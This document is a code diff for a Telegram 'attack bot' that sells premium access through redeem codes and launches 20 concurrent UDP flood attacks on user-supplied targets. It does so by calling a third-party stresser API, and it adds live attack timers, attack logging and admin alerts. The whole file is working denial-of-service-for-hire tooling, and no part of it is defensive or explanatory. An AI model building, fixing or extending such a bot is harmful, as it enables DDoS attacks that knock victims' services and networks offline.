@@ -1,3 +1,4 @@
+# app.py - COMPLETE FIXED VERSION
 import os
 import logging
 import asyncio
@@ -6,10 +7,9 @@ import aiohttp
 import time
 import random
 import string
-import json
 from datetime import datetime, timedelta
-from flask import Flask, jsonify, request
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
+from flask import Flask, jsonify
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application, 
     CommandHandler, 
@@ -20,7 +20,6 @@ from telegram.ext import (
 )
 from pymongo import MongoClient
 from dotenv import load_dotenv
-from functools import wraps
 
 load_dotenv()
 
@@ -32,7 +31,6 @@ OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
 PSEUDO_OWNER_ID = int(os.getenv("PSEUDO_OWNER_ID", "987654321"))
 PORT = int(os.getenv("PORT", 8080))
 MAX_CONCURRENT = 20
-ADMIN_IDS = [int(id) for id in os.getenv("ADMIN_IDS", "").split(",") if id]
 
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
@@ -45,30 +43,11 @@ flask_app = Flask(__name__)
 
 @flask_app.route('/')
 def index():
-    return jsonify({
-        "status": "online",
-        "bot": "GURU Attack Bot",
-        "version": "2.0",
-        "timestamp": datetime.now().isoformat()
-    })
+    return "🤖 GURU Attack Bot is Running!"
 
 @flask_app.route('/health')
 def health():
-    return jsonify({
-        "status": "healthy",
-        "timestamp": datetime.now().isoformat(),
-        "active_attacks": len(attack_manager.active_attacks) if 'attack_manager' in globals() else 0
-    })
-
-@flask_app.route('/webhook', methods=['POST'])
-def webhook():
-    """Handle webhook updates from Telegram"""
-    if request.headers.get('X-Telegram-Bot-Api-Secret-Token') != os.getenv('WEBHOOK_SECRET'):
-        return jsonify({"error": "Unauthorized"}), 403
-    
-    update = Update.de_json(request.get_json(), application.bot)
-    application.process_update(update)
-    return jsonify({"ok": True})
+    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})
 
 # ===== DATABASE =====
 class Database:
@@ -83,12 +62,9 @@ class Database:
                 self.codes = self.db.redeem_codes
                 self.logs = self.db.attack_logs
                 self.admins = self.db.admins
-                self.settings = self.db.settings
-                self.broadcasts = self.db.broadcasts
                 
                 self.users.create_index("user_id", unique=True)
                 self.codes.create_index("code", unique=True)
-                self.logs.create_index("timestamp", expireAfterSeconds=2592000)  # 30 days
                 
                 logger.info("✅ MongoDB connected")
             else:
@@ -100,10 +76,7 @@ class Database:
             self.codes = {}
             self.logs = []
             self.admins = {}
-            self.settings = {}
-            self.broadcasts = []
     
-    # User Management
     def add_user(self, user_id, username=None, first_name=None):
         if not self.memory_mode:
             result = self.users.update_one(
@@ -115,13 +88,7 @@ class Database:
                     "plan": "free",
                     "plan_expiry": None,
                     "has_used_code": False,
-                    "is_banned": False,
-                    "ban_reason": None,
-                    "banned_by": None,
-                    "banned_at": None,
-                    "total_attacks": 0,
-                    "attack_count_24h": 0,
-                    "last_attack_reset": datetime.now()
+                    "is_banned": False
                 }},
                 upsert=True
             )
@@ -135,8 +102,7 @@ class Database:
                     "plan": "free",
                     "plan_expiry": None,
                     "has_used_code": False,
-                    "is_banned": False,
-                    "total_attacks": 0
+                    "is_banned": False
                 }
                 return True
             return False
@@ -175,48 +141,17 @@ class Database:
                 return True
             return False
     
-    def increment_attack_count(self, user_id):
-        if not self.memory_mode:
-            # Reset 24h counter if needed
-            user = self.get_user(user_id)
-            if user:
-                last_reset = user.get("last_attack_reset")
-                if not last_reset or (datetime.now() - last_reset).days >= 1:
-                    self.users.update_one(
-                        {"user_id": user_id},
-                        {"$set": {"attack_count_24h": 0, "last_attack_reset": datetime.now()}}
-                    )
-            
-            self.users.update_one(
-                {"user_id": user_id},
-                {"$inc": {"total_attacks": 1, "attack_count_24h": 1}}
-            )
-        else:
-            if user_id in self.users:
-                self.users[user_id]["total_attacks"] = self.users[user_id].get("total_attacks", 0) + 1
-    
     def get_user_stats(self, user_id):
         if not self.memory_mode:
-            user = self.get_user(user_id)
-            if user:
-                return {
-                    "total_attacks": user.get("total_attacks", 0),
-                    "attack_count_24h": user.get("attack_count_24h", 0)
-                }
-            return {"total_attacks": 0, "attack_count_24h": 0}
+            return self.logs.count_documents({"user_id": user_id})
         else:
-            user = self.users.get(user_id)
-            return {
-                "total_attacks": user.get("total_attacks", 0) if user else 0,
-                "attack_count_24h": 0
-            }
+            return len([l for l in self.logs if l.get("user_id") == user_id])
     
     def get_total_attacks(self):
         if not self.memory_mode:
             return self.logs.count_documents({})
         return len(self.logs)
     
-    # Admin Management
     def is_admin(self, user_id):
         if not self.memory_mode:
             return self.admins.find_one({"user_id": user_id}) is not None
@@ -267,21 +202,11 @@ class Database:
             return list(self.admins.find({}))
         return [{"user_id": uid, "level": data.get("level", "admin")} for uid, data in self.admins.items()]
     
-    def get_admin_list(self):
-        admins = self.get_admins()
-        return [admin['user_id'] for admin in admins]
-    
-    # Ban Management
     def ban_user(self, user_id, reason=None, banned_by=None):
         if not self.memory_mode:
             self.users.update_one(
                 {"user_id": user_id},
-                {"$set": {
-                    "is_banned": True, 
-                    "ban_reason": reason, 
-                    "banned_by": banned_by, 
-                    "banned_at": datetime.now()
-                }}
+                {"$set": {"is_banned": True, "ban_reason": reason, "banned_by": banned_by, "banned_at": datetime.now()}}
             )
         elif user_id in self.users:
             self.users[user_id]["is_banned"] = True
@@ -290,7 +215,7 @@ class Database:
         if not self.memory_mode:
             self.users.update_one(
                 {"user_id": user_id},
-                {"$set": {"is_banned": False, "ban_reason": None, "banned_by": None, "banned_at": None}}
+                {"$set": {"is_banned": False, "ban_reason": None}}
             )
         elif user_id in self.users:
             self.users[user_id]["is_banned"] = False
@@ -299,12 +224,6 @@ class Database:
         user = self.get_user(user_id)
         return user.get("is_banned", False) if user else False
     
-    def get_banned_users(self):
-        if not self.memory_mode:
-            return list(self.users.find({"is_banned": True}))
-        return [uid for uid, data in self.users.items() if data.get("is_banned", False)]
-    
-    # Redeem Codes
     def create_code(self, code, days, created_by):
         if not self.memory_mode:
             if self.codes.find_one({"code": code}):
@@ -334,10 +253,12 @@ class Database:
         if not self.memory_mode:
             code_data = self.codes.find_one({"code": code, "is_used": False})
             if code_data:
+                # Mark code as used
                 self.codes.update_one(
                     {"code": code},
                     {"$set": {"is_used": True, "used_by": user_id, "used_at": datetime.now()}}
                 )
+                # Update user plan
                 expiry = datetime.now() + timedelta(days=code_data['access_days'])
                 self.users.update_one(
                     {"user_id": user_id},
@@ -382,12 +303,6 @@ class Database:
                 return True
         return False
     
-    def get_code_by_code(self, code):
-        if not self.memory_mode:
-            return self.codes.find_one({"code": code})
-        return self.codes.get(code)
-    
-    # Attack Logs
     def log_attack(self, user_id, target, port, duration, method, status, response, concurrent_count=20):
         log = {
             "user_id": user_id,
@@ -405,8 +320,6 @@ class Database:
         else:
             self.logs.append(log)
         
-        self.increment_attack_count(user_id)
-        
         user = self.get_user(user_id)
         username = user.get("username") if user else None
         first_name = user.get("first_name") if user else None
@@ -421,70 +334,6 @@ class Database:
             "concurrent": concurrent_count
         }
     
-    def get_attack_logs(self, user_id=None, limit=10):
-        if not self.memory_mode:
-            query = {"user_id": user_id} if user_id else {}
-            return list(self.logs.find(query).sort("timestamp", -1).limit(limit))
-        else:
-            logs = self.logs
-            if user_id:
-                logs = [l for l in logs if l.get("user_id") == user_id]
-            return logs[-limit:] if logs else []
-    
-    def get_user_attack_count(self, user_id, days=1):
-        if not self.memory_mode:
-            cutoff = datetime.now() - timedelta(days=days)
-            return self.logs.count_documents({
-                "user_id": user_id,
-                "timestamp": {"$gte": cutoff}
-            })
-        else:
-            cutoff = datetime.now() - timedelta(days=days)
-            return len([l for l in self.logs if l.get("user_id") == user_id and l.get("timestamp", datetime.min) >= cutoff])
-    
-    # Broadcast
-    def save_broadcast(self, message, sent_by, total, successful, failed):
-        if not self.memory_mode:
-            self.broadcasts.insert_one({
-                "message": message,
-                "sent_by": sent_by,
-                "sent_at": datetime.now(),
-                "total_recipients": total,
-                "successful": successful,
-                "failed": failed
-            })
-        else:
-            self.broadcasts.append({
-                "message": message,
-                "sent_by": sent_by,
-                "sent_at": datetime.now(),
-                "total_recipients": total,
-                "successful": successful,
-                "failed": failed
-            })
-    
-    def get_broadcasts(self, limit=10):
-        if not self.memory_mode:
-            return list(self.broadcasts.find({}).sort("sent_at", -1).limit(limit))
-        return self.broadcasts[-limit:] if self.broadcasts else []
-    
-    # Settings
-    def get_setting(self, key, default=None):
-        if not self.memory_mode:
-            setting = self.settings.find_one({"key": key})
-            return setting.get("value") if setting else default
-        return self.settings.get(key, default)
-    
-    def set_setting(self, key, value):
-        if not self.memory_mode:
-            self.settings.update_one(
-                {"key": key},
-                {"$set": {"value": value, "updated_at": datetime.now()}},
-                upsert=True
-            )
-        else:
-            self.settings[key] = value
-    
     def get_all_users(self):
         if not self.memory_mode:
             return list(self.users.find({}))
@@ -494,6 +343,7 @@ db = Database(MONGO_URI)
 
 # ===== INITIALIZE OWNER =====
 def init_owner():
+    """Ensure owner exists in database"""
     owner = db.get_user(OWNER_ID)
     if not owner:
         db.add_user(OWNER_ID, "owner", "Owner")
@@ -501,9 +351,10 @@ def init_owner():
     if not db.is_admin(OWNER_ID):
         db.add_admin(OWNER_ID, "owner", "owner", OWNER_ID)
     
+    # Ensure owner has premium
     plan, expiry = db.get_user_plan(OWNER_ID)
     if plan != "premium":
-        db.update_user_plan(OWNER_ID, "premium", None)
+        db.update_user_plan(OWNER_ID, "premium", None)  # None = lifetime
 
 init_owner()
 
@@ -515,7 +366,6 @@ class AttackManager:
         self.lock = threading.Lock()
         self.total_attacks = 0
         self.concurrent_busy = 0
-        self.attack_history = []
     
     def can_start_attack(self, user_id):
         with self.lock:
@@ -553,35 +403,20 @@ class AttackManager:
                 return True
             return False
     
-    def stop_all_attacks(self):
-        with self.lock:
-            for aid in list(self.active_attacks.keys()):
-                self.active_attacks[aid]['status'] = 'stopped'
-            self.concurrent_busy = 0
-            return True
-    
     def get_active_attacks(self, user_id=None):
         with self.lock:
             if user_id:
                 return {aid: att for aid, att in self.active_attacks.items() if att['user_id'] == user_id and att['status'] == 'running'}
             return {aid: att for aid, att in self.active_attacks.items() if att['status'] == 'running'}
     
-    def get_all_attacks(self, user_id=None):
-        with self.lock:
-            if user_id:
-                return {aid: att for aid, att in self.active_attacks.items() if att['user_id'] == user_id}
-            return dict(self.active_attacks)
-    
     def get_stats(self):
         with self.lock:
             active = len([a for a in self.active_attacks.values() if a['status'] == 'running'])
-            total = len(self.active_attacks)
             return {
                 'active': active,
                 'concurrent_busy': self.concurrent_busy,
-                'total': total,
-                'max': MAX_CONCURRENT,
-                'global_total': self.total_attacks
+                'total': self.total_attacks,
+                'max': MAX_CONCURRENT
             }
     
     def cleanup(self):
@@ -594,15 +429,14 @@ class AttackManager:
                 elif (now - att['start_time']).seconds > att['duration'] + 15:
                     to_remove.append(aid)
             for aid in to_remove:
-                if aid in self.active_attacks:
-                    del self.active_attacks[aid]
-                    self.concurrent_busy = max(0, self.concurrent_busy - 1)
-            return len(to_remove)
+                del self.active_attacks[aid]
+                self.concurrent_busy = max(0, self.concurrent_busy - 1)
 
 attack_manager = AttackManager()
 
 # ===== SEND ALERT TO ADMINS =====
 async def send_attack_alert(attack_info):
+    """Send real-time attack alert to all admins"""
     try:
         admins = db.get_admins()
         user = db.get_user(attack_info['user_id'])
@@ -636,6 +470,7 @@ async def send_attack_alert(attack_info):
 
 # ===== API-ONLY UDP ATTACK =====
 async def send_udp_attack(target, port, duration, attack_num):
+    """API-ONLY UDP attack - No fallback"""
     url = "https://api.susstresser.com/panel/api/api.php"
     
     params = {
@@ -689,8 +524,10 @@ async def send_udp_attack(target, port, duration, attack_num):
 
 # ===== 20 CONCURRENT ATTACKS WITH LIVE UPDATES =====
 async def send_20_concurrent_attacks(target, port, duration, user_id, context):
+    """Launch 20 concurrent API attacks with live time updates"""
     logger.info(f"🚀 Launching 20 concurrent UDP attacks on {target}:{port}")
     
+    # Create status message for user
     status_msg = await context.bot.send_message(
         chat_id=user_id,
         text=f"🔥 *ATTACK RUNNING*\n\n"
@@ -708,14 +545,18 @@ async def send_20_concurrent_attacks(target, port, duration, user_id, context):
         task = send_udp_attack(target, port, duration, i)
         tasks.append(task)
     
+    # Update timer every 5 seconds
     timer_task = asyncio.create_task(update_timer(status_msg, duration, target, port))
     
+    # Wait for attacks to complete
     results = await asyncio.gather(*tasks)
     
+    # Stop timer
     timer_task.cancel()
     
     success_count = sum(1 for r in results if r.get('success', False))
     
+    # Final message
     final_text = (
         f"✅ *20x UDP ATTACK COMPLETE!*\n\n"
         f"🎯 Target: `{target}:{port}`\n"
@@ -737,6 +578,7 @@ async def send_20_concurrent_attacks(target, port, duration, user_id, context):
     }
 
 async def update_timer(status_msg, duration, target, port):
+    """Update the timer every 5 seconds"""
     try:
         start_time = time.time()
         last_update = 0
@@ -748,6 +590,7 @@ async def update_timer(status_msg, duration, target, port):
             if remaining <= 0:
                 break
             
+            # Update every 5 seconds
             if int(elapsed) % 5 == 0 and int(elapsed) != last_update:
                 last_update = int(elapsed)
                 try:
@@ -770,84 +613,74 @@ async def update_timer(status_msg, duration, target, port):
     except Exception as e:
         logger.error(f"Timer update error: {e}")
 
-# ===== KEYBOARDS =====
-class Keyboards:
-    @staticmethod
-    def main_menu(user_id):
-        is_admin = db.is_admin(user_id)
-        is_owner = db.is_owner_or_pseudo(user_id)
-        is_banned = db.is_banned(user_id)
-        
-        keyboard = []
-        
-        if not is_banned:
-            keyboard.append([InlineKeyboardButton("💥 ATTACK", callback_data="attack")])
-            keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
-        
-        if is_admin:
-            keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
-            keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
-        
-        if is_owner:
-            keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
-        
-        if not is_admin and not is_owner:
-            keyboard.append([InlineKeyboardButton("👤 MY INFO", callback_data="info")])
-        
-        return InlineKeyboardMarkup(keyboard)
-
 # ===== BOT HANDLERS =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = user.id
     
+    # Add user to database
     db.add_user(user_id, user.username, user.first_name)
     
+    # Check if user has premium
     plan, expiry = db.get_user_plan(user_id)
+    
+    # Check if user is admin (can bypass premium check)
     is_admin = db.is_admin(user_id)
     
+    # DEBUG: Log the user's plan
     logger.info(f"User {user_id} - Plan: {plan}, Expiry: {expiry}, Is Admin: {is_admin}")
     
-    if plan != "premium" and not is_admin:
-        await update.message.reply_text(
-            "❌ *ACCESS DENIED*\n\n"
-            "You need a redeem code to use this bot.\n"
-            "Contact an admin to get a code.\n\n"
-            "If you have a code, use:\n"
-            "`/redeem YOUR_CODE`",
-            parse_mode='Markdown'
-        )
-        return
-    
+    # FIXED: Allow ALL users to access the bot, just show their plan status
     stats = attack_manager.get_stats()
-    user_stats = db.get_user_stats(user_id)
+    total_attacks = db.get_user_stats(user_id)
     
-    plan_display = "💎 PREMIUM"
-    if expiry:
-        days_left = max(0, (expiry - datetime.now()).days)
-        plan_display += f" ({days_left}d left)"
+    if plan == "premium":
+        if expiry:
+            days_left = max(0, (expiry - datetime.now()).days)
+            plan_display = f"💎 PREMIUM ({days_left}d left)"
+        else:
+            plan_display = "💎 PREMIUM (Lifetime)"
     else:
-        plan_display = "💎 PREMIUM (Lifetime)"
+        plan_display = "🆓 FREE (Redeem code to upgrade)"
     
     first_name = user.first_name or "User"
     welcome_msg = (
         f"👋 *WELCOME TO GURU*\n\n"
         f"Hello {first_name}! 👋\n"
-        f"📊 Total Attacks: {user_stats.get('total_attacks', 0)}\n"
+        f"📊 Total Attacks: {total_attacks}\n"
         f"📊 Plan: {plan_display}\n"
-        f"⚡ 20x UDP Concurrent: ENABLED\n"
-        f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user_id) else '❌ BANNED'}"
+        f"⚡ 20x UDP Concurrent: {'ENABLED' if plan == 'premium' else '❌ PREMIUM ONLY'}\n"
+        f"⚡ Status: {'✅ ACTIVE' if not db.is_banned(user_id) else '❌ BANNED'}\n\n"
+        f"{'💡 Use /redeem CODE to get premium access!' if plan != 'premium' else '🎯 Use /attack to start attacking!'}"
     )
+    
+    keyboard = []
+    if not db.is_banned(user_id):
+        if plan == "premium":
+            keyboard.append([InlineKeyboardButton("💥 ATTACK", callback_data="attack")])
+        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
+    
+    if is_admin:
+        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
+        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
+    
+    if db.is_owner_or_pseudo(user_id):
+        keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
+    
+    if not is_admin:
+        keyboard.append([InlineKeyboardButton("👤 MY INFO", callback_data="info")])
     
     await update.message.reply_text(
         welcome_msg,
-        reply_markup=Keyboards.main_menu(user_id),
+        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None,
         parse_mode='Markdown'
     )
 
+# ===== ATTACK COMMAND =====
 async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
+    # Check if user has premium OR is admin
     plan, expiry = db.get_user_plan(user_id)
     is_admin = db.is_admin(user_id)
     
@@ -855,7 +688,8 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             "❌ *PREMIUM REQUIRED*\n\n"
             "You need a premium plan to attack.\n"
-            "Use `/redeem CODE` to activate.",
+            "Use `/redeem CODE` to activate.\n\n"
+            "Contact an admin to get a redeem code.",
             parse_mode='Markdown'
         )
         return
@@ -903,14 +737,17 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
         
+        # Run attacks with live updates
         result = await send_20_concurrent_attacks(target, port, duration, user_id, context)
         
+        # Log attack
         attack_info = db.log_attack(
             user_id, target, port, duration, "udp",
             "success" if result.get('success') else "failed",
             str(result)
         )
         
+        # Send real-time alert to admins
         await send_attack_alert(attack_info)
         
         attack_manager.stop_attack(attack_id)
@@ -921,6 +758,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"❌ Error: {str(e)}")
 
+# ===== BUTTON ATTACK =====
 async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -933,7 +771,8 @@ async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if plan != "premium" and not is_admin:
         await query.edit_message_text(
             "❌ *PREMIUM REQUIRED*\n\n"
-            "You need a premium plan to attack.",
+            "You need a premium plan to attack.\n"
+            "Use `/redeem CODE` to activate.",
             parse_mode='Markdown'
         )
         return
@@ -1034,6 +873,7 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     context.user_data['awaiting_attack'] = False
 
+# ===== MY PLAN =====
 async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -1045,9 +885,11 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text = (
             "👤 *MY PLAN*\n\n"
             "📊 Plan: 🆓 FREE\n"
-            "⏱️ Status: Inactive\n\n"
+            "⏱️ Status: Inactive\n"
+            "⚡ 20x UDP: ❌ DISABLED\n\n"
             "💡 *Upgrade:*\n"
-            "Use `/redeem CODE` to get premium access."
+            "Use `/redeem CODE` to get premium access.\n"
+            "Contact an admin to get a code."
         )
     else:
         if expiry:
@@ -1079,6 +921,7 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
     )
 
+# ===== INFO =====
 async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -1086,7 +929,7 @@ async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = query.from_user.id
     level = db.get_admin_level(user_id) or "USER"
     plan, expiry = db.get_user_plan(user_id)
-    user_stats = db.get_user_stats(user_id)
+    total_attacks = db.get_user_stats(user_id)
     
     if plan == "free":
         plan_display = "FREE"
@@ -1102,13 +945,13 @@ async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🆔 ID: {user_id}\n"
         f"⭐ Level: {level.upper()}\n"
         f"📊 Plan: {plan_display}\n"
-        f"⚡ 20x UDP: ENABLED\n"
-        f"💥 Total Attacks: {user_stats.get('total_attacks', 0)}\n"
-        f"📈 Attacks (24h): {user_stats.get('attack_count_24h', 0)}",
+        f"⚡ 20x UDP: {'ENABLED' if plan == 'premium' else 'DISABLED'}\n"
+        f"💥 Total Attacks: {total_attacks}",
         parse_mode='Markdown',
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
     )
 
+# ===== STATS =====
 async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -1123,24 +966,21 @@ async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     admins = db.get_admins()
     codes = db.get_codes()
     active = len(attack_manager.active_attacks)
-    banned = db.get_banned_users()
     
     premium_users = sum(1 for u in users if u.get('plan') == 'premium')
-    active_users = sum(1 for u in users if u.get('last_active') and (datetime.now() - u['last_active']).days < 7)
+    banned_users = sum(1 for u in users if u.get('is_banned', False))
     
     stats_text = (
         f"📊 *BOT STATISTICS*\n\n"
         f"👥 Total Users: {len(users)}\n"
         f"💎 Premium Users: {premium_users}\n"
-        f"🟢 Active Users (7d): {active_users}\n"
+        f"🚫 Banned Users: {banned_users}\n"
         f"👑 Admins: {len(admins)}\n"
-        f"🚫 Banned: {len(banned)}\n"
         f"💥 Total Attacks: {total_attacks}\n"
         f"🎫 Redeem Codes: {len(codes)}\n"
         f"⚡ Active Attacks: {active}/{MAX_CONCURRENT}\n"
         f"⚡ 20x UDP: ENABLED\n"
-        f"🌐 Status: ONLINE\n"
-        f"📅 Uptime: {get_uptime()}"
+        f"🌐 Status: ONLINE"
     )
     
     await query.edit_message_text(
@@ -1148,18 +988,6 @@ async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown',
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
     )
-
-def get_uptime():
-    """Get bot uptime"""
-    try:
-        with open('/proc/uptime', 'r') as f:
-            uptime_seconds = float(f.readline().split()[0])
-            days = int(uptime_seconds // 86400)
-            hours = int((uptime_seconds % 86400) // 3600)
-            minutes = int((uptime_seconds % 3600) // 60)
-            return f"{days}d {hours}h {minutes}m"
-    except:
-        return "N/A"
 
 # ===== ADMIN PANEL =====
 async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1176,7 +1004,6 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("📋 LIST CODES", callback_data="admin_list")],
         [InlineKeyboardButton("🗑️ DELETE CODE", callback_data="admin_delete")],
         [InlineKeyboardButton("📊 STATS", callback_data="stats")],
-        [InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast")],
         [InlineKeyboardButton("🔙 BACK", callback_data="back")]
     ]
     
@@ -1242,7 +1069,8 @@ async def admin_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE
         for c in codes[:20]:
             status = "✅" if not c.get('is_used') else f"❌ Used"
             used_by = f" by {c.get('used_by')}" if c.get('used_by') else ""
-            text += f"`{c['code']}` - {c['access_days']}d - {status}{used_by}\n"
+            duration = "LIFETIME" if c['access_days'] >= 3650 else f"{c['access_days']}d"
+            text += f"`{c['code']}` - {duration} - {status}{used_by}\n"
     
     await query.edit_message_text(
         text[:4000],
@@ -1284,125 +1112,6 @@ async def process_delete_callback(update: Update, context: ContextTypes.DEFAULT_
     else:
         await query.edit_message_text("❌ Failed to delete code!")
 
-# ===== BROADCAST =====
-async def admin_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    await query.edit_message_text(
-        "📢 *BROADCAST*\n\n"
-        "Send your broadcast message:\n"
-        "Type /cancel to cancel",
-        parse_mode='Markdown'
-    )
-    context.user_data['awaiting_broadcast'] = True
-
-async def process_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.user_data.get('awaiting_broadcast'):
-        return
-    
-    if update.message.text.lower() == '/cancel':
-        context.user_data['awaiting_broadcast'] = False
-        await update.message.reply_text("✅ Broadcast cancelled.")
-        return
-    
-    user_id = update.effective_user.id
-    if not db.is_admin(user_id):
-        await update.message.reply_text("❌ Access denied!")
-        return
-    
-    message = update.message.text
-    
-    # Show confirmation
-    keyboard = [
-        [InlineKeyboardButton("✅ Send Broadcast", callback_data="broadcast_confirm")],
-        [InlineKeyboardButton("❌ Cancel", callback_data="broadcast_cancel")]
-    ]
-    context.user_data['broadcast_message'] = message
-    
-    await update.message.reply_text(
-        f"📢 *Broadcast Preview*\n\n"
-        f"{message[:500]}...\n\n"
-        f"Send to all users?",
-        reply_markup=InlineKeyboardMarkup(keyboard),
-        parse_mode='Markdown'
-    )
-
-async def broadcast_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    user_id = query.from_user.id
-    if not db.is_admin(user_id):
-        await query.edit_message_text("❌ Access denied!")
-        return
-    
-    message = context.user_data.get('broadcast_message')
-    if not message:
-        await query.edit_message_text("❌ No message to broadcast.")
-        return
-    
-    # Send broadcast
-    users = db.get_all_users()
-    total = len(users)
-    successful = 0
-    failed = 0
-    
-    progress_msg = await query.edit_message_text(
-        f"📢 *Sending Broadcast...*\n\n"
-        f"Total: {total} users\n"
-        f"Progress: 0/{total}"
-    )
-    
-    for i, user in enumerate(users):
-        try:
-            await application.bot.send_message(
-                user['user_id'],
-                f"📢 *ANNOUNCEMENT*\n\n{message}",
-                parse_mode='Markdown'
-            )
-            successful += 1
-        except:
-            failed += 1
-        
-        # Update progress every 10 users
-        if i % 10 == 0:
-            try:
-                await progress_msg.edit_text(
-                    f"📢 *Sending Broadcast...*\n\n"
-                    f"Total: {total} users\n"
-                    f"Progress: {i}/{total}\n"
-                    f"✅ Successful: {successful}\n"
-                    f"❌ Failed: {failed}"
-                )
-            except:
-                pass
-        
-        # Rate limit
-        await asyncio.sleep(0.05)
-    
-    db.save_broadcast(message, user_id, total, successful, failed)
-    
-    await progress_msg.edit_text(
-        f"✅ *Broadcast Complete!*\n\n"
-        f"Total: {total} users\n"
-        f"✅ Successful: {successful}\n"
-        f"❌ Failed: {failed}",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
-    )
-    
-    context.user_data.pop('broadcast_message', None)
-
-async def broadcast_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    context.user_data.pop('broadcast_message', None)
-    await query.edit_message_text(
-        "❌ Broadcast cancelled.",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
-    )
-
 # ===== OWNER PANEL =====
 async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1422,9 +1131,6 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("📊 STATS", callback_data="stats")],
         [InlineKeyboardButton("📋 LIST ADMINS", callback_data="owner_list_admins")],
         [InlineKeyboardButton("📋 LIST USERS", callback_data="owner_list_users")],
-        [InlineKeyboardButton("📋 ATTACK LOGS", callback_data="owner_attack_logs")],
-        [InlineKeyboardButton("🚫 BANNED USERS", callback_data="owner_banned_users")],
-        [InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast")],
         [InlineKeyboardButton("🔙 BACK", callback_data="back")]
     ]
     
@@ -1434,64 +1140,8 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-async def owner_attack_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    if not db.is_owner_or_pseudo(query.from_user.id):
-        await query.answer("Access denied!", show_alert=True)
-        return
-    
-    logs = db.get_attack_logs(limit=20)
-    if not logs:
-        await query.edit_message_text("📋 No attack logs found.")
-        return
-    
-    text = "📋 *RECENT ATTACK LOGS*\n\n"
-    for log in logs[:10]:
-        user = db.get_user(log.get('user_id'))
-        username = user.get('username') if user else 'Unknown'
-        text += f"👤 {username} → `{log.get('target')}`\n"
-        text += f"   ⏱️ {log.get('duration')}s | {log.get('method').upper()}\n"
-        text += f"   📅 {log.get('timestamp').strftime('%Y-%m-%d %H:%M')}\n\n"
-    
-    await query.edit_message_text(
-        text[:4000],
-        parse_mode='Markdown',
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
-    )
-
-async def owner_banned_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    
-    if not db.is_owner_or_pseudo(query.from_user.id):
-        await query.answer("Access denied!", show_alert=True)
-        return
-    
-    banned = db.get_banned_users()
-    if not banned:
-        await query.edit_message_text("🚫 No banned users.")
-        return
-    
-    text = "🚫 *BANNED USERS*\n\n"
-    for user in banned[:20]:
